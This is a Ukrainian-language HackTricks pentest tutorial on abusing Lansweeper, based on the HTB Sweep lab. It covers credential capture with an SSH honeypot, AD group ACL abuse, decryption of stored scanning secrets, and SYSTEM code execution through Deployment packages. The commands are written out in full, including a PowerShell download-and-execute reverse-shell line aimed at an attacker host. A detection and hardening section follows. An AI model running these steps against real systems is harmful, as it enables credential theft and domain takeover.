# Зловживання Lansweeper: отримання облікових даних, розшифрування секретів і RCE через Deployment

{{#include ../../banners/hacktricks-training.md}}

Lansweeper — це платформа для виявлення та інвентаризації IT-активів, яку зазвичай розгортають у Windows та інтегрують з Active Directory. Облікові дані, налаштовані в Lansweeper, використовуються його механізмами сканування для автентифікації в активах через такі протоколи, як SSH, SMB/WMI і WinRM. Поширені неправильні налаштування дають змогу:

- Перехоплювати облікові дані, перенаправляючи ціль сканування на хост під контролем атакувальника (honeypot)
- Зловживати ACL в AD, доступними через групи, пов’язані з Lansweeper, щоб отримати віддалений доступ
- Розшифровувати на хості секрети, налаштовані в Lansweeper (рядки підключення та збережені облікові дані для сканування)
- Виконувати код на керованих кінцевих точках через функцію Deployment (часто від імені SYSTEM)

На цій сторінці узагальнено практичні сценарії та команди атакувальника для зловживання цими можливостями під час перевірок.

## 1) Отримання облікових даних для сканування через honeypot (приклад із SSH)

Ідея: створити Scanning Target, який вказує на ваш хост, і призначити йому наявні Scanning Credentials. Коли запуститься сканування, Lansweeper спробує автентифікуватися за допомогою цих облікових даних, а ваш honeypot перехопить їх.<sup>[[1]](#references)</sup>

Огляд кроків (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (або Single IP) = ваша VPN IP-адреса
- Налаштуйте порт SSH на доступний (наприклад, 2022, якщо 22 заблокований)
- Вимкніть розклад і заплануйте ручний запуск
- Scanning → Scanning Credentials → переконайтеся, що облікові дані Linux/SSH існують; призначте їх новій цілі (за потреби увімкніть усі)
- Натисніть “Scan now” на цілі
- Запустіть SSH honeypot і отримайте ім’я користувача/пароль, які використовувалися під час спроби входу

Приклад із sshesame:<sup>[[2]](#references)</sup>
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Перевірте отримані облікові дані у службах DC:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Примітки
- Працює аналогічно для інших протоколів, коли можна змусити сканер підключитися до вашого listener (SMB/WinRM honeypots тощо). SSH часто є найпростішим варіантом.
- Багато сканерів ідентифікують себе за допомогою характерних client banners (наприклад, RebexSSH) і виконують benign commands (uname, whoami тощо).

## 2) AD ACL abuse: отримання remote access шляхом додавання себе до app-admin group

Використовуйте BloodHound для переліку effective rights скомпрометованого облікового запису. Поширений результат — scanner- або app-specific group (наприклад, “Lansweeper Discovery”), яка має GenericAll над privileged group (наприклад, “Lansweeper Admins”). Якщо privileged group також є членом “Remote Management Users”, WinRM стане доступним після того, як ми додамо себе.<sup>[[1]](#references)[[5]](#references)</sup>

Приклади collection:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Експлуатація GenericAll для групи за допомогою BloodyAD (Linux):<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Потім отримайте інтерактивний shell:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Порада: Операції Kerberos чутливі до часу. Якщо ви отримали KRB_AP_ERR_SKEW, спочатку синхронізуйте час із DC:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Розшифрування секретів, налаштованих у Lansweeper, на хості

На сервері Lansweeper сайт ASP.NET зазвичай зберігає зашифрований connection string і симетричний ключ, який використовує застосунок. За наявності відповідного локального доступу можна розшифрувати connection string до БД, а потім отримати збережені облікові дані для сканування.<sup>[[1]](#references)</sup>

Типові розташування:
- Конфігурація вебсайту: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Ключ застосунку: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Використовуйте SharpLansweeperDecrypt для автоматизації розшифрування та виведення збережених облікових даних:<sup>[[3]](#references)</sup>
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
Очікуваний результат містить дані для підключення до DB і облікові дані для сканування у відкритому вигляді, зокрема облікові записи Windows і Linux, які використовуються в усій інфраструктурі. Вони часто мають розширені локальні права на доменних хостах:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Використовуйте відновлені облікові дані сканування Windows для привілейованого доступу:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Розгортання Lansweeper → SYSTEM RCE

Як учасник групи “Lansweeper Admins”, у вебінтерфейсі доступні розділи Deployment і Configuration. У розділі Deployment → Deployment packages можна створювати пакети, які виконують довільні команди на вибраних assets. Виконання здійснюється сервісом Lansweeper із високими привілеями, що забезпечує code execution від імені NT AUTHORITY\SYSTEM на вибраному хості.<sup>[[1]](#references)</sup>

Основні кроки:
- Створіть новий Deployment package, який запускає однорядкову команду PowerShell або cmd (reverse shell, add-user тощо).
- Виберіть потрібний asset (наприклад, DC/хост, на якому працює Lansweeper) і натисніть Deploy/Run now.
- Отримайте shell із правами SYSTEM.

Приклади payload (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Дії з розгортання є гучними та залишають записи в Lansweeper і журналах подій Windows. Використовуйте їх обачно.

## Виявлення та hardening

- Обмежте або видаліть анонімні SMB-енумерації. Відстежуйте RID cycling і аномальний доступ до спільних ресурсів Lansweeper.
- Контроль вихідного трафіку: заблокуйте або жорстко обмежте вихідні SSH/SMB/WinRM-з'єднання зі scanner hosts. Сповіщайте про нестандартні порти (наприклад, 2022) і незвичні client banners, як-от Rebex.
- Захистіть `Website\\web.config` і `Key\\Encryption.txt`. Винесіть secrets у vault і виконуйте їх ротацію в разі leak. Розгляньте service accounts із мінімальними привілеями та gMSA, де це можливо.
- Моніторинг AD: сповіщайте про зміни в групах, пов'язаних із Lansweeper (наприклад, «Lansweeper Admins», «Remote Management Users»), а також про зміни ACL, що надають GenericAll/Write для членства у привілейованих групах.
- Аудит створення, змін і виконання пакетів `Deployment`; сповіщайте про пакети, що запускають cmd.exe/powershell.exe або створюють неочікувані вихідні з'єднання.

## Пов'язані теми
- SMB/LSA/SAMR enumeration і RID cycling
- Kerberos password spraying і міркування щодо clock skew
- Аналіз шляхів BloodHound для application-admin groups
- Використання WinRM і lateral movement

## References
- [1] [HTB: Sweep — Зловживання Lansweeper Scanning, AD ACLs і Secrets для захоплення DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
